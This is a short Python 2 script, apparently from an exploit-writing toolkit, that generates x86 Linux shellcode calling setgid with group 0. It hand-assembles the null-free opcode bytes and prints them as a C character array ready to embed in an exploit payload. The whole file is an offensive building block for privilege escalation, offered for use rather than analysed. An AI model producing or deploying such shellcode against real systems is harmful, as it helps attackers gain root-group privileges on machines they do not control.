from struct import pack
import sys 
import binascii

##########################################################
#
#  1.  setgid shellcode
#  
#
#	                         random	     2014-04-21
##########################################################


##########################################################
des_format = 'shellcode: setgid(%s)' 
ALIGN = 4
GID = 0
##########################################################

def out_format(language):
	if language=='c':
		des = '\n\n/*\n*  '+ des_format +'\n*/'
	elif language=='python':
		des = '\n\n#  '+ des_format +'  #'
	elif language=='perl':
		des = '\n\n#  '+ des_format +'  #'
	else:
		return 
	print des % (str(GID))




def getshellcode(language, shellcode):
	new_shellcode = ''
	if language == 'bin':
			new_shellcode = shellcode
			sys.stdout.write(new_shellcode)
	if language == 'c':
			sys.stdout.write("\nchar shellcode[] = \\\n\"")
			for i in xrange(len(shellcode)):
				tmp =  '\\'+ str(hex(ord(shellcode[i])))[1:]  
				new_shellcode += tmp
				sys.stdout.write(tmp)
				if   not (i+1) % 16 :
					sys.stdout.write("\"\n\"")
			sys.stdout.write("\";\n\n\n")
	if language == 'perl':
			pass
	if language == 'python':
			pass	

def setgid_shellcode(groupid):
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x31\xdb'													#xor ebx,ebx
	if (groupid <= 0):
		pass
	elif (groupid <= 0xff):
		shellcode += '\xb3' + pack('B',groupid)							#mov bl,GID
	elif (groupid > 0xff):
		if not (groupid & 0xFF):
			shellcode += '\x66\xbb' + pack('H',groupid+1)			#mov bx,(GID+1)
			shellcode += '\x66\x4b'											#dec bx
		else:
			shellcode += '\x66\xbb' + pack('H',groupid)				#mov bx,(GID)
	shellcode += '\xb0\x2E'													#mov ax,0x2E
	shellcode += '\xcd\x80'													#int 0x80  -----> setgid(GID)
	return shellcode


if __name__ == '__main__':

	language = 'c'
	shellcode = setgid_shellcode(GID)
	out_format(language)
	getshellcode(language, shellcode)
	



